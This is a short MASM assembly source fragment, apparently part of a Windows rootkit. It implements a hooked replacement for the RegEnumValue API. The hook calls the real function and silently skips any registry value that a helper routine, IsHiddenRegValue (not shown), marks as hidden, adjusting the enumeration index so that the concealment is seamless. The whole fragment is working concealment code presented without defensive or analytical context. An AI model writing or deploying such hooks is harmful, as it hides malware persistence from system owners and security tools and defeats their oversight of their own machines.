
.data
	nHdnCount dd 0	; Hidden records counter (for delta)


.code

;; -------------------------------------------------------------------------------- ;;
NewRegEnumValue proc p1:dword, p2:dword, p3:dword, p4:dword, p5:dword, p6:dword, p7:dword, p8:dword
	local RealRegEnumValue : dword

	mov RealRegEnumValue, eax

; Init counter if search from begining
	.if p2==0
		mov nHdnCount, 0
; else add delta to dwIndex
	.else
		mov eax, nHdnCount
		add p2, eax
	.endif

@RealRegEnumValue:
	push p8					; lpcbData
	push p7					; lpData
	push p6					; lpType
	push p5					; lpReserved
	push p4					; lpcchValueName
	push p3					; lpValueName
	push p2					; dwIndex
	push p1					; hKey
	call RealRegEnumValue	; Real RegEnumValue
	.if eax!=ERROR_SUCCESS
		ret
	.endif

	pushad

; Decision: to hide or not to hide
	mov ebx, p3
	call IsHiddenRegValue
	.if ebx==0
		popad
		ret
	.endif

; Hide Value (replace by next)
	inc p2			; Next dwIndex
	inc nHdnCount	; Increase counter (for delta)
	popad
	jmp @RealRegEnumValue
NewRegEnumValue endp

